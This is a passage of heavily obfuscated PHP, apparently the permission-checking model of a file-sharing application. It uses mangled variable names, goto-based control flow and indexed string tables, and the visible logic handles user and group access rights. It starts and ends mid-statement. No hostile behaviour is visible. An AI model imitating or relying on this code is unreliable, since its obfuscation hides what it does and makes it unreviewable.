$E°²×ÎĞî¼) { $E·Èˆ¨ØÏ = array(); foreach ($E°²×ÎĞî¼[$cÜ°ñĞ·ÜÌ[1840]] as $DäİÔÉ´…Ú) { $dÀ ™ó† = $DäİÔÉ´…Ú[$cÜ°ñĞ·ÜÌ[449]]; $c¾Şê Ÿ¨™ = $DäİÔÉ´…Ú[$cÜ°ñĞ·ÜÌ[1505]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $aÖî‡«ò»µ = $DäİÔÉ´…Ú[$cÜ°ñĞ·ÜÌ[1505]] ? $DäİÔÉ´…Ú[$cÜ°ñĞ·ÜÌ[1505]] : $DäİÔÉ´…Ú[$cÜ°ñĞ·ÜÌ[1668]]; if ($DäİÔÉ´…Ú[$cÜ°ñĞ·ÜÌ[1505]] && $DäİÔÉ´…Ú[$cÜ°ñĞ·ÜÌ[1505]] == $dö÷Ğ”ÈÆÀ) { continue; } $E·Èˆ¨ØÏ[] = array($cÜ°ñĞ·ÜÌ[399] => $E°²×ÎĞî¼[$cÜ°ñĞ·ÜÌ[399]], $cÜ°ñĞ·ÜÌ[407] => $c¾Şê Ÿ¨™, $cÜ°ñĞ·ÜÌ[487] => intval($aÖî‡«ò»µ), $cÜ°ñĞ·ÜÌ[1764] => isset($dÀ ™ó†[$cÜ°ñĞ·ÜÌ[397]]) ? intval($dÀ ™ó†[$cÜ°ñĞ·ÜÌ[397]]) : 0, $cÜ°ñĞ·ÜÌ[1818] => isset($dÀ ™ó†[$cÜ°ñĞ·ÜÌ[1818]]) ? intval($dÀ ™ó†[$cÜ°ñĞ·ÜÌ[1818]]) : -1); } $E·Èˆ¨ØÏ[] = array($cÜ°ñĞ·ÜÌ[399] => $E°²×ÎĞî¼[$cÜ°ñĞ·ÜÌ[399]], $cÜ°ñĞ·ÜÌ[407] => SourceModel::TYPE_USER, $cÜ°ñĞ·ÜÌ[487] => intval($dö÷Ğ”ÈÆÀ), $cÜ°ñĞ·ÜÌ[1764] => intval($d×éí’ÂÆê), $cÜ°ñĞ·ÜÌ[1818] => -1); $this->where(array($cÜ°ñĞ·ÜÌ[413] => $E°²×ÎĞî¼[$cÜ°ñĞ·ÜÌ[399]]))->delete(); $this->addAll($E·Èˆ¨ØÏ); } return !0; } public function get($dğ¯…”Æ¾) { $eÂ“ ±¶‹à = $this->getSourceList(array($dğ¯…”Æ¾), !0); return $eÂ“ ±¶‹à[0]; } public function getSourceList($d•ˆ˜†‹Ÿ, $Eáí‡ÅÉÔº = false, $D·¡´Â© = false) { goto b¿““°Åï; cƒ«òÖäô‡: $eí‚³”Ò¶­ = array(); foreach ($Eáí‡ÅÉÔº as $C§›¦µÕ”° => $EæÄÊ©õŒƒ) { if ($B”Ìò‘Á¿) { $eí‚³”Ò¶­[$C§›¦µÕ”°] = $C¡ï¯¦‰¨; continue; } $eí‚³”Ò¶­[$C§›¦µÕ”°] = $this->makeSourceAuth($EæÄÊ©õŒƒ, $B‰¬ªÛò¨Ì, $D·¡´Â©); } return $eí‚³”Ò¶­; goto aîÍ“Ñ…‡; F·…ñ˜‚Š: $AÚ±‹ÌÅ‘è = $this->sourceAuthSelect($cŠ™ç‡ù§); $B‰¬ªÛò¨Ì = array(); foreach ($cŠ™ç‡ù§ as $C§›¦µÕ”°) { if (isset($AÚ±‹ÌÅ‘è[$C§›¦µÕ”°])) { $B‰¬ªÛò¨Ì[$C§›¦µÕ”°] = $AÚ±‹ÌÅ‘è[$C§›¦µÕ”°]; } } goto D…áƒæó…±; EËìº”¥Š: if (!$Eáí‡ÅÉÔº && count($d•ˆ˜†‹Ÿ) == 1) { $Eáí‡ÅÉÔº = array(); $Eáí‡ÅÉÔº[$d•ˆ˜†‹Ÿ[0]] = $cÍ“ŞĞéÍæ->sourceInfo($d•ˆ˜†‹Ÿ[0]); } if (!$Eáí‡ÅÉÔº) { $Aì­‡ˆ¨² = array($cÜÎš¾Íº[413] => array($cÜÎš¾Íº[414], $d•ˆ˜†‹Ÿ)); $Eáí‡ÅÉÔº = $cÍ“ŞĞéÍæ->field($cÜÎš¾Íº[1844])->where($Aì­‡ˆ¨²)->select(); $Eáí‡ÅÉÔº = array_to_keyvalue($Eáí‡ÅÉÔº, $cÜÎš¾Íº[399]); } $cŠ™ç‡ù§ = $d•ˆ˜†‹Ÿ; goto B´†ÏºßË; B´†ÏºßË: foreach ($Eáí‡ÅÉÔº as $c“Šá –ïğ => $f¡Ã°‡š) { $ağ ‚¶˜ = $cÍ“ŞĞéÍæ->parentLevelArray($f¡Ã°‡š[$cÜÎš¾Íº[490]]); $cŠ™ç‡ù§ = array_merge($cŠ™ç‡ù§, array($c“Šá –ïğ), array_reverse($ağ ‚¶˜)); } $cŠ™ç‡ù§ = array_values(array_unique($cŠ™ç‡ù§)); if (!$cŠ™ç‡ù§) { return array(); } goto F·…ñ˜‚Š; b¿““°Åï: $cÜÎš¾Íº =& $_SERVER[¾÷]; if (!$d•ˆ˜†‹Ÿ) { return array(); } $cÍ“ŞĞéÍæ = Model($cÜÎš¾Íº[1180]); goto EËìº”¥Š; D…áƒæó…±: $B”Ìò‘Á¿ = $this->userIsRoot($D·¡´Â©); $F’Ó½ˆ×ó‹ = AuthModel::authAll(); $C¡ï¯¦‰¨ = array($cÜÎš¾Íº[410] => $F’Ó½ˆ×ó‹, $cÜÎš¾Íº[1845] => array($cÜÎš¾Íº[415] => 0, $cÜÎš¾Íº[1674] => $F’Ó½ˆ×ó‹, $cÜÎš¾Íº[416] => LNG($cÜÎš¾Íº[1846]), $cÜÎš¾Íº[1689] => $cÜÎš¾Íº[1847])); goto cƒ«òÖäô‡; aîÍ“Ñ…‡: } public function authDeepCheck($F‰ÅĞ‡º—˜, $F‘ôÄÕğ‘¶ = false) { goto CÊÙ®ÌÓŠ; f°¶æ¸”¯Ì: if (!in_array($F‰ÅĞ‡º—˜, $bèÅùá†ˆ§[$Cµ³Ö…°¿ë[1848]])) { return !1; } $Cô¢ùæ¤È = array(); foreach ($bèÅùá†ˆ§[$Cµ³Ö…°¿ë[1849]] as $CğÛÑÙÌ÷¢ => $c™»Å“æÜ) { if (!in_array($F‰ÅĞ‡º—˜, $c™»Å“æÜ)) { continue; } $Cô¢ùæ¤È[] = $CğÛÑÙÌ÷¢; } goto dÒ»õ’í ‡; dÒ»õ’í ‡: if (!$Cô¢ùæ¤È) { return !1; } $d˜ø¥ªó§ = $Cô¢ùæ¤È ? $Cô¢ùæ¤È[0] : $F‰ÅĞ‡º—˜; return array($Cµ³Ö…°¿ë[410] => -1, $Cµ³Ö…°¿ë[449] => array($Cµ³Ö…°¿ë[415] => $Cµ³Ö…°¿ë[1061], $Cµ³Ö…°¿ë[1674] => $Cµ³Ö…°¿ë[500], $Cµ³Ö…°¿ë[416] => LNG($Cµ³Ö…°¿ë[1850]), $Cµ³Ö…°¿ë[1689] => $Cµ³Ö…°¿ë[1851]), $Cµ³Ö…°¿ë[1852] => LNG($Cµ³Ö…°¿ë[1853]), $Cµ³Ö…°¿ë[1854] => $this->sourceAuthInfo($d˜ø¥ªó§)); goto Eœâïƒ›«; CÊÙ®ÌÓŠ: $Cµ³Ö…°¿ë =& $_SERVER[¾÷]; $F‘ôÄÕğ‘¶ = $F‘ôÄÕğ‘¶ ? $F‘ôÄÕğ‘¶ : USER_ID; $bèÅùá†ˆ§ = $this->makeAuthDeep($F‘ôÄÕğ‘¶); goto f°¶æ¸”¯Ì; Eœâïƒ›«: } protected function makeAuthDeep($A™ĞàƒìÇ± = false) { goto AàäñË³ ; B†‹ˆŠ±®: $CÅ©––È›Î = array($D‚ßÓš¥óÀ[1848] => $B’Ûçñ‚¦½, $D‚ßÓš¥óÀ[1849] => $Bœ®À§¥ğ); $bÄ­µÖ¿Û®[$A™ĞàƒìÇ±] = $CÅ©––È›Î; return $CÅ©––È›Î; goto Dàôïä„áÄ; dŸçóŞíå: $B¶¿†Í·Í = array_to_keyvalue_group($cÁºö³†»Û, $D‚ßÓš¥óÀ[399]); foreach ($B¶¿†Í·Í as $bÑ”ôÅ => $F‘ç’…»Ï) { $DÈŸÔµ„Ğî = $this->authArrayCheck($F‘ç’…»Ï, $A™ĞàƒìÇ±); if ($DÈŸÔµ„Ğî[$D‚ßÓš¥óÀ[410]] > 0) { $DŒ¡Öµç˜æ[] = $bÑ”ôÅ . $D‚ßÓš¥óÀ[43]; } } $B’Ûçñ‚¦½ = array(); goto Cæ¦µ§îÅƒ; cğêø·º«¡: $Bœ®À§¥ğ = array(); $f èÌ„Ç™¤ = array(); $e¨æÜƒâ˜¸ = array(); goto F—Î¹œ‹Œ½; aàÅÜ‘äÇ: $BÑ¼—ƒØ›ò = $b¢çÎÊî™; foreach ($BÑ¼—ƒØ›ò as $dÙ½‘ËŠ×æ) { $fÌİÂ·Š´½ = $a³ùæˆÔ”Š->getInfo($dÙ½‘ËŠ×æ); $C‹´›À÷ˆî = $aøà•±áó->parentLevelArray($fÌİÂ·Š´½[$D‚ßÓš¥óÀ[490]]); $b¢çÎÊî™ = array_merge($b¢çÎÊî™, $C‹´›À÷ˆî); } $b¢çÎÊî™ = array_values(array_unique($b¢çÎÊî™)); goto f¹Ø‰ëğïï; D–ß¥µ£Ø: foreach ($f‘­ÓŞëš£ as $b¤ÎÚˆÖ×ñ) { if ($b¤ÎÚˆÖ×ñ[$D‚ßÓš¥óÀ[409]] == 0 && $b¤ÎÚˆÖ×ñ[$D‚ßÓš¥óÀ[1690]] == $D‚ßÓš¥óÀ[96]) { $C¨‹•Õ™¯[] = $b¤ÎÚˆÖ×ñ[$D‚ßÓš¥óÀ[397]]; } } $EÁ£ùå«ÁÀ = $this->userGroupParents($A™ĞàƒìÇ±); $b­ØÇ³³­¤ = array($D‚ßÓš¥óÀ[407] => SourceModel::TYPE_USER, $D‚ßÓš¥óÀ[487] => $A™ĞàƒìÇ±); goto cÎ×è¿“İ; bøÈå¶ˆÕå: if (isset($bÄ­µÖ¿Û®[$A™ĞàƒìÇ±])) { return $bÄ­µÖ¿Û®[$A™ĞàƒìÇ±]; } $f‘­ÓŞëš£ = Model($D‚ßÓš¥óÀ[1855])->listData(); $C¨‹•Õ™¯ = array(); goto D–ß¥µ£Ø; cÎ×è¿“İ: if ($EÁ£ùå«ÁÀ) { $b­ØÇ³³­¤ = array(array($D‚ßÓš¥óÀ[407] => SourceModel::TYPE_USER, $D‚ßÓš¥óÀ[487] => $A™ĞàƒìÇ±), array($D‚ßÓš¥óÀ[407] => SourceModel::TYPE_GROUP, $D‚ßÓš¥óÀ[487] => array($D‚ßÓš¥óÀ[414], $EÁ£ùå«ÁÀ)), $D‚ßÓš¥óÀ[934] => $D‚ßÓš¥óÀ[1756]); } $cÁºö³†»Û = $this->field($D‚ßÓš¥óÀ[1856])->where($b­ØÇ³³­¤)->select(); $DŒ¡Öµç˜æ = array(); goto dŸçóŞíå; Cæ¦µ§îÅƒ: $b¢çÎÊî™ = $EÁ£ùå«ÁÀ; $aøà•±áó = Model($D‚ßÓš¥óÀ[1180]); $a³ùæˆÔ”Š = Model($D‚ßÓš¥óÀ[489]); goto cğêø·º«¡; F—Î¹œ‹Œ½: $FÚÍƒµ¾†„ = array(); if ($DŒ¡Öµç˜æ) { $f¨íß ßçê = $aøà•±áó->where(array($D‚ßÓš¥óÀ[399] => array($D‚ßÓš¥óÀ[414], $DŒ¡Öµç˜æ)))->select(); foreach ($f¨íß ßçê as $d¢…¢•™¾) { $C‹´›À÷ˆî = $aøà•±áó->parentLevelArray($d¢…¢•™¾[$D‚ßÓš¥óÀ[490]]); $B’Ûçñ‚¦½ = array_merge($B’Ûçñ‚¦½, $C‹´›À÷ˆî); $b¢çÎÊî™[] = $d¢…¢•™¾[$D‚ßÓš¥óÀ[487]]; $Bœ®À§¥ğ[$d¢…¢•™¾[$D‚ßÓš¥óÀ[399]]] = $C‹´›À÷ˆî; $f èÌ„Ç™¤[$d¢…¢•™¾[$D‚ßÓš¥óÀ[399]]] = $d¢…¢•™¾[$D‚ßÓš¥óÀ[487]]; } } $b¢çÎÊî™ = array_values(array_unique($b¢çÎÊî™)); goto aàÅÜ‘äÇ; AàäñË³ : $D‚ßÓš¥óÀ =& $_SERVER[¾÷]; static $bÄ­µÖ¿Û® = array(); $A™ĞàƒìÇ± = $A™ĞàƒìÇ± ? $A™ĞàƒìÇ± : USER_ID; goto bøÈå¶ˆÕå; f¹Ø‰ëğïï: foreach ($b¢çÎÊî™ as $dÙ½‘ËŠ×æ) { $fÌİÂ·Š´½ = $a³ùæˆÔ”Š->getInfo($dÙ½‘ËŠ×æ); $B’Ûçñ‚¦½[] = $fÌİÂ·Š´½[$D‚ßÓš¥óÀ[94]][$D‚ßÓš¥óÀ[399]]; $e¨æÜƒâ˜¸[$dÙ½‘ËŠ×æ] = $fÌİÂ·Š´½[$D‚ßÓš¥óÀ[94]][$D‚ßÓš¥óÀ[399]]; $FÚÍƒµ¾†„[$dÙ½‘ËŠ×æ] = $aøà•±áó->parentLevelArray($fÌİÂ·Š´½[$D‚ßÓš¥óÀ[490]]); } foreach ($Bœ®À§¥ğ as $b“¾ö¼®¹ö => $d—™‹’åø«) { $Eïß˜—È‹¢ = $f èÌ„Ç™¤[$b“¾ö¼®¹ö]; if (!$Eïß˜—È‹¢ || !$e¨æÜƒâ˜¸[$Eïß˜—È‹¢]) { continue; } $EãèĞ–Óº = array(); foreach ($FÚÍƒµ¾†„[$Eïß˜—È‹¢] as $dÙ½‘ËŠ×æ) { $EãèĞ–Óº[] = $e¨æÜƒâ˜¸[$dÙ½‘ËŠ×æ]; } $Bœ®À§¥ğ[$b“¾ö¼®¹ö] = array_merge($EãèĞ–Óº, $d—™‹’åø«); } $B’Ûçñ‚¦½ = array_values(array_unique($B’Ûçñ‚¦½)); goto B†‹ˆŠ±®; Dàôïä„áÄ: } private function makeSourceAuth($b·­šåÀ”À, $A¯ÖÕÔÓ×, $aõ‰‘ßêÖ = false) { goto AÈ¶ÙÖ¢×’; a´º°îÂ†¿: if (!$EÌ•¯…¯Ü) { $a°½óÅ‘ˆ = Model($EÔ¶î˜Û“³[489])->getInfo($dÔÇ¸¼çÚÛ); $B’Š×šÜñÊ = explode($EÔ¶î˜Û“³[57], trim($a°½óÅ‘ˆ[$EÔ¶î˜Û“³[490]], $EÔ¶î˜Û“³[57])); $B’Š×šÜñÊ = array_reverse($B’Š×šÜñÊ); foreach ($B’Š×šÜñÊ as $fË‚èí«¸‚) { if ($fË‚èí«¸‚ == $EÔ¶î˜Û“³[500] || $fË‚èí«¸‚ == $B×ëÖ”çÇÌ) { continue; } $DèÔ¥—§áĞ = $this->groupRootAuth($fË‚èí«¸‚, $aõ‰‘ßêÖ); if (!$DèÔ¥—§áĞ) { continue; } $EÌ•¯…¯Ü = $this->groupAuthInfo($DèÔ¥—§áĞ, $fË‚èí«¸‚); break; } } if (!$EÌ•¯…¯Ü || $EÌ•¯…¯Ü[$EÔ¶î˜Û“³[410]] <= 0) { $DÈËˆ—®¡Ù = $this->authDeepCheck($b·­šåÀ”À[$EÔ¶î˜Û“³[399]], $aõ‰‘ßêÖ); if ($DÈËˆ—®¡Ù) { $EÌ•¯…¯Ü = $DÈËˆ—®¡Ù; } } return $EÌ•¯…¯Ü; goto cò®Ô¨Ô´; B†‘¡Œê: foreach ($còõòÄï–® as $EÚ÷¸Éõ) { if (!isset($A¯ÖÕÔÓ×[$EÚ÷¸Éõ])) { continue; } $fÆ˜£…š×† = $this->authMake($A¯ÖÕÔÓ×[$EÚ÷¸Éõ], $aõ‰‘ßêÖ); if ($fÆ˜£…š×†[$EÔ¶î˜Û“³[449]]) { $EÌ•¯…¯Ü = $fÆ˜£…š×†; break; } } if (!$dÄ–Š®ßÈ½) { return $EÌ•¯…¯Ü; } if (!$EÌ•¯…¯Ü && $b»½İÕ·–Ñ) { $EÌ•¯…¯Ü = $this->groupAuthInfo($b»½İÕ·–Ñ, $dÔÇ¸¼çÚÛ); } goto a´º°îÂ†¿; AÈ¶ÙÖ¢×’: $EÔ¶î˜Û“³ =& $_SERVER[¾÷]; $B×ëÖ”çÇÌ = $EÔ¶î˜Û“³[96]; $dÔÇ¸¼çÚÛ = $b·­šåÀ”À[$EÔ¶î˜Û“³[487]]; goto b¤İ¨×‚¿; b¤İ¨×‚¿: $dÄ–Š®ßÈ½ = $b·­šåÀ”À[$EÔ¶î˜Û“³[407]] == SourceModel::TYPE_GROUP; $b»½İÕ·–Ñ = $dÄ–Š®ßÈ½ ? $this->groupRootAuth($dÔÇ¸¼çÚÛ, $aõ‰‘ßêÖ) : !1; if ($b»½İÕ·–Ñ && Model($EÔ¶î˜Û“³[1836])->authCheckAction($b»½İÕ·–Ñ[$EÔ¶î˜Û“³[409]], $EÔ¶î˜Û“³[1688])) { return $this->groupAuthInfo($b»½İÕ·–Ñ, $dÔÇ¸¼çÚÛ); } goto Fê›ÃŒ‰Á·; Fê›ÃŒ‰Á·: $còõòÄï–® = Model($EÔ¶î˜Û“³[1180])->parentLevelArray($b·­šåÀ”À[$EÔ¶î˜Û“³[490]]); $còõòÄï–® = array_merge(array($b·­šåÀ”À[$EÔ¶î˜Û“³[399]]), array_reverse($còõòÄï–®)); $EÌ•¯…¯Ü = !1; goto B†‘¡Œê; cò®Ô¨Ô´: } private function userIsRoot($cëª¡‹¸¸Ü = false) { $Cä¦‰Ø¼îè =& $_SERVER[¾÷]; if (!$cëª¡‹¸¸Ü && _get($GLOBALS, $Cä¦‰Ø¼îè[488])) { return !0; } $fÅˆ¸¼Ò¹ = Model($Cä¦‰Ø¼îè[510])->getInfo($cëª¡‹¸¸Ü); $Bì’·Ó›´ª = Model($Cä¦‰Ø¼îè[1857])->listData($fÅˆ¸¼Ò¹[$Cä¦‰Ø¼îè[1389]]); if ($Bì’·Ó›´ª && $Bì’·Ó›´ª[$Cä¦‰Ø¼îè[1258]][$Cä¦‰Ø¼îè[1858]] == 1) { return !0; } return !1; } private function sourceAuthInfo($Bâº¤ƒ´Çô) { goto DçªöÏÒ¤Ø; a™ÈƒÕô»©: if (isset($E÷”ØÖÓõ[$DËÌµ¬ğäÕ[495]])) { $dåŞÎ°ÔÁÄ = explode($DËÌµ¬ğäÕ[18], trim($E÷”ØÖÓõ[$DËÌµ¬ğäÕ[498]], $DËÌµ¬ğäÕ[18])); array_shift($dåŞÎ°ÔÁÄ); $b¬‹ë¬ñÌ¼ = $E÷”ØÖÓõ[$DËÌµ¬ğäÕ[493]] . $DËÌµ¬ğäÕ[1859] . implode($DËÌµ¬ğäÕ[18], $dåŞÎ°ÔÁÄ); } return array($DËÌµ¬ğäÕ[416] => $E÷”ØÖÓõ[$DËÌµ¬ğäÕ[38]], $DËÌµ¬ğäÕ[85] => KodIO::make($E÷”ØÖÓõ[$DËÌµ¬ğäÕ[399]]), $DËÌµ¬ğäÕ[1860] => $b¬‹ë¬ñÌ¼); goto BÒŠñ’ ğå; AÖšŠ‘ˆÔ: if (!$E÷”ØÖÓõ) { return !1; } $C×¡ğëÁ¶->groupPathDisplay($E÷”ØÖÓõ); $aŒ´õ¾¶ª· = array($E÷”ØÖÓõ); goto eÊ˜¶˜èôï; eÊ˜¶˜èôï: $aŒ´õ¾¶ª· = $C×¡ğëÁ¶->_listAppendPath($aŒ´õ¾¶ª·); $E÷”ØÖÓõ = $aŒ´õ¾¶ª·[0]; $b¬‹ë¬ñÌ¼ = $E÷”ØÖÓõ[$DËÌµ¬ğäÕ[498]]; goto a™ÈƒÕô»©; DçªöÏÒ¤Ø: $DËÌµ¬ğäÕ =& $_SERVER[¾÷]; $C×¡ğëÁ¶ = Model($DËÌµ¬ğäÕ[1180]); $E÷”ØÖÓõ = $C×¡ğëÁ¶->sourceInfo($Bâº¤ƒ´Çô); goto AÖšŠ‘ˆÔ; BÒŠñ’ ğå: } private function groupAuthInfo($A¢Î ºšƒ, $aî©‰¦”Ì) { $cÜÙ”©¯ÜÁ =& $_SERVER[¾÷]; $eÕ§¦…’éµ = Model($cÜÙ”©¯ÜÁ[489])->getInfo($aî©‰¦”Ì); return array($cÜÙ”©¯ÜÁ[1861] => intval($A¢Î ºšƒ[$cÜÙ”©¯ÜÁ[409]]), $cÜÙ”©¯ÜÁ[1845] => $A¢Î ºšƒ, $cÜÙ”©¯ÜÁ[1862] => LNG($cÜÙ”©¯ÜÁ[1863]), $cÜÙ”©¯ÜÁ[1854] => array($cÜÙ”©¯ÜÁ[416] => $eÕ§¦…’éµ[$cÜÙ”©¯ÜÁ[38]], $cÜÙ”©¯ÜÁ[85] => KodIO::make($eÕ§¦…’éµ[$cÜÙ”©¯ÜÁ[94]][$cÜÙ”©¯ÜÁ[399]]), $cÜÙ”©¯ÜÁ[1860] => $eÕ§¦…’éµ[$cÜÙ”©¯ÜÁ[494]])); } protected function groupRootAuth($c¶†“›¡™í, $B˜áÃÛ³™Ô = false) { goto cøïÆÜ«¾Á; Bµâ»©”„: $eÙ‰†ŠÙøÄ[$eË¿‡˜Š›Ç] = $F£³ÇÕ¹ë« ? $F£³ÇÕ¹ë« : $bËËŸ§‘…; return $eÙ‰†ŠÙøÄ[$eË¿‡˜Š›Ç]; goto d ƒ¢øï“; B°“µªšòç: static $eÙ‰†ŠÙøÄ = array(); if (isset($eÙ‰†ŠÙøÄ[$eË¿‡˜Š›Ç])) { return $eÙ‰†ŠÙøÄ[$eË¿‡˜Š›Ç]; } $féƒ‰‘šéæ = Model($d½¿ì¢ò[489])->getInfo($c¶†“›¡™í); goto a¸ù²¬çÎŠ; a¸ù²¬çÎŠ: $Dİé†¤¤‚Ã = $this->userGroupList($B˜áÃÛ³™Ô); $bËËŸ§‘… = isset($Dİé†¤¤‚Ã[$c¶†“›¡™í]) ? $Dİé†¤¤‚Ã[$c¶†“›¡™í][$d½¿ì¢ò[409]] : !1; if ($bËËŸ§‘… && Model($d½¿ì¢ò[1836])->authCheckAction($bËËŸ§‘…[$d½¿ì¢ò[409]], $d½¿ì¢ò[1688])) { $eÙ‰†ŠÙøÄ[$eË¿‡˜Š›Ç] = $bËËŸ§‘…; return $bËËŸ§‘…; } goto d÷šëà‘è; d÷šëà‘è: $E×Ë²„šæÏ = $this->sourceAuthSelect($féƒ‰‘šéæ[$d½¿ì¢ò[94]][$d½¿ì¢ò[399]]); $Cğ°‚‰±¡” = $E×Ë²„šæÏ ? $this->authMake($E×Ë²„šæÏ, $B˜áÃÛ³™Ô) : !1; $F£³ÇÕ¹ë« = $Cğ°‚‰±¡” ? $Cğ°‚‰±¡”[$d½¿ì¢ò[449]] : !1; goto Bµâ»©”„; cøïÆÜ«¾Á: $d½¿ì¢ò =& $_SERVER[¾÷]; $B˜áÃÛ³™Ô = $B˜áÃÛ³™Ô ? $B˜áÃÛ³™Ô : USER_ID; $eË¿‡˜Š›Ç = $B˜áÃÛ³™Ô . $d½¿ì¢ò[1864] . $c¶†“›¡™í; goto B°“µªšòç; d ƒ¢øï“: } public function authOwnerApply($cÂÀˆ˜÷) { goto AÁ­·îÄù‘; AÁ­·îÄù‘: $Eİ¬è›‚Ã‰ =& $_SERVER[¾÷]; if (empty($cÂÀˆ˜÷[$Eİ¬è›‚Ã‰[409]]) || isset($cÂÀˆ˜÷[$Eİ¬è›‚Ã‰[1865]]) && $cÂÀˆ˜÷[$Eİ¬è›‚Ã‰[1865]]) { return $cÂÀˆ˜÷; } if (AuthModel::authCheckRoot($cÂÀˆ˜÷[$Eİ¬è›‚Ã‰[409]][$Eİ¬è›‚Ã‰[410]])) { return $cÂÀˆ˜÷; } goto bœ·†îºä‚; b”¹¼óõ®: if (count($b§šš¦ôÔÕ) == 0) { $b§šš¦ôÔÕ = $this->authFolderOwnerGroup($cÂÀˆ˜÷[$Eİ¬è›‚Ã‰[487]]); } $b§šš¦ôÔÕ = array_unique($b§šš¦ôÔÕ); if (AuthModel::authCheckRoot($cÂÀˆ˜÷[$Eİ¬è›‚Ã‰[409]][$Eİ¬è›‚Ã‰[410]])) { $b§šš¦ôÔÕ[] = USER_ID; } goto eìŠæë„£Á; eìŠæë„£Á: $cÂÀˆ˜÷[$Eİ¬è›‚Ã‰[409]][$Eİ¬è›‚Ã‰[1867]] = Model($Eİ¬è›‚Ã‰[506])->userListInfo($b§šš¦ôÔÕ); return $cÂÀˆ˜÷; goto B™šßñëù¸; bœ·†îºä‚: $föñ á¢Ä® = Model($Eİ¬è›‚Ã‰[1180])->parentLevelArray($cÂÀˆ˜÷[$Eİ¬è›‚Ã‰[490]]); $föñ á¢Ä® = array_merge(array($cÂÀˆ˜÷[$Eİ¬è›‚Ã‰[399]]), array_reverse($föñ á¢Ä®)); $Cø«¢àîœ = $this->sourceAuthSelect($föñ á¢Ä®); goto bÜİ‹Ä—±Í; bÜİ‹Ä—±Í: $Dš»§¥ÕÒ„ = array(); $b§šš¦ôÔÕ = array(); foreach ($Cø«¢àîœ as $C˜¢ò£—é => $cÙÑßÌìÒ) { $f™ÖÌ»õÑ« = $this->authFolderOwnerUser($cÙÑßÌìÒ); $Dš»§¥ÕÒ„[$C˜¢ò£—é] = $f™ÖÌ»õÑ«; $b§šš¦ôÔÕ = array_merge($b§šš¦ôÔÕ, $f™ÖÌ»õÑ«[$Eİ¬è›‚Ã‰[566]]); if ($f™ÖÌ»õÑ«[$Eİ¬è›‚Ã‰[1866]]) { break; } } goto b”¹¼óõ®; B™šßñëù¸: } private function authFolderOwnerGroup($Bİê¨¬¡‡Ã) { $CØÑĞ˜ÀÔ¯ =& $_SERVER[¾÷]; $CíŠÆìÁõ¡ = Model($CØÑĞ˜ÀÔ¯[1750])->where(array($CØÑĞ˜ÀÔ¯[1668] => $Bİê¨¬¡‡Ã))->select(); $cÔøÉĞŞ¹Á = array(); if (!$CíŠÆìÁõ¡) { return $cÔøÉĞŞ¹Á; } foreach ($CíŠÆìÁõ¡ as $d®Å˜‰Åß™) { $b¶»§‡—İŸ = $this->authInfo($d®Å˜‰Åß™); if (AuthModel::authCheckRoot($b¶»§‡—İŸ[$CØÑĞ˜ÀÔ¯[409]])) { $cÔøÉĞŞ¹Á[] = $d®Å˜‰Åß™[$CØÑĞ˜ÀÔ¯[1505]]; } } return $cÔøÉĞŞ¹Á; } private function authFolderOwnerUser($A°´Áæ¿ï) { $EÂ­›õ™ =& $_SERVER[¾÷]; $aÌ¿ô¨¹»Š = array(); $Dª‚õğ²× = !1; foreach ($A°´Áæ¿ï as $FÌŞ™áé‚Ú) { $c‰¼…ŒŒÆ÷ = $this->authInfo($FÌŞ™áé‚Ú); if ($FÌŞ™áé‚Ú[$EÂ­›õ™[487]] == $EÂ­›õ™[500]) { $Dª‚õğ²× = !0; } if ($FÌŞ™áé‚Ú[$EÂ­›õ™[407]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($c‰¼…ŒŒÆ÷[$EÂ­›õ™[409]])) { $aÌ¿ô¨¹»Š[] = $FÌŞ™áé‚Ú[$EÂ­›õ™[487]]; } } } return array($EÂ­›õ™[566] => $aÌ¿ô¨¹»Š, $EÂ­›õ™[1866] => $Dª‚õğ²×); } public function authMake($AÙ§­ø×, $Fä°ÏÄ´…Õ = false) { $d†½¶íĞ =& $_SERVER[¾÷]; $eÛ¤Ø©³ = $this->authArrayCheck($AÙ§­ø×, $Fä°ÏÄ´…Õ); if ($eÛ¤Ø©³[$d†½¶íĞ[1868]]) { $eÛ¤Ø©³[$d†½¶íĞ[1868]] = $this->sourceAuthInfo($eÛ¤Ø©³[$d†½¶íĞ[1868]]); } return $eÛ¤Ø©³; } public function authArrayCheck($fÈÉ†ÄÔ÷, $C–†…âÎß² = false) { goto fµ£¯Çä˜­; FÁ³ˆõï: $fŠ†ö¡– = 0; $b«…•óâ“ = 0; $bÔÚ”…‘†è = array($EçóÚùŠ­[399] => 0); goto C¶™†¥²; cêâÎñ¨§: $cà¯µ×±¾Ä = 1000; $f¯¥Å—¹½â = 0; $C— å‰ÍºÈ = 0; goto FÁ³ˆõï; e«˜œÛ­¬Õ: $f‡Šö›…º = 0; $eĞ±Ú¦¸¿İ = 0; $C˜’Š›öèÇ = 0; goto cêâÎñ¨§; Eç—‚å‹Â: return $f¡ò™¼Â”; goto dšÓ‹±Õ¡Ñ; fµ£¯Çä˜­: $EçóÚùŠ­ =& $_SERVER[¾÷]; if (!$fÈÉ†ÄÔ÷) { return array($EçóÚùŠ­[410] => 0, $EçóÚùŠ­[449] => !1); } $C–†…âÎß² = $C–†…âÎß² ? $C–†…âÎß² : USER_ID; goto cµæ¸µ´Ğœ; C¶™†¥²: foreach ($fÈÉ†ÄÔ÷ as $bÔÚ”…‘†è) { $EÚ«Í‘§óä = $this->authInfo($bÔÚ”…‘†è); if (!$EÚ«Í‘§óä) { continue; } $c‹ä¦…ÍÈí = $bÔÚ”…‘†è[$EçóÚùŠ­[487]]; $C¥Ÿç¯‰‡Œ = intval($EÚ«Í‘§óä[$EçóÚùŠ­[409]]); if ($bÔÚ”…‘†è[$EçóÚùŠ­[407]] == SourceModel::TYPE_USER && $c‹ä¦…ÍÈí == $C–†…âÎß²) { $bä­÷„„ğ = !0; $E¬¨£§÷¿ = $EÚ«Í‘§óä; $dÀÔòœ¤ = $C¥Ÿç¯‰‡Œ; } else { if ($bÔÚ”…‘†è[$EçóÚùŠ­[407]] == SourceModel::TYPE_GROUP && $this->groupContainUser($c‹ä¦…ÍÈí, $C–†…âÎß²)) { $f‡Šö›…º = !0; $dÖÈ™·¶•› = $this->groupStepToUserGroup($c‹ä¦…ÍÈí, $C–†…âÎß²); if ($dÖÈ™·¶•› < $cà¯µ×±¾Ä) { $cà¯µ×±¾Ä = $dÖÈ™·¶•›; $eĞ±Ú¦¸¿İ = $C¥Ÿç¯‰‡Œ; $C˜’Š›öèÇ = $EÚ«Í‘§óä; $f¯¥Å—¹½â = 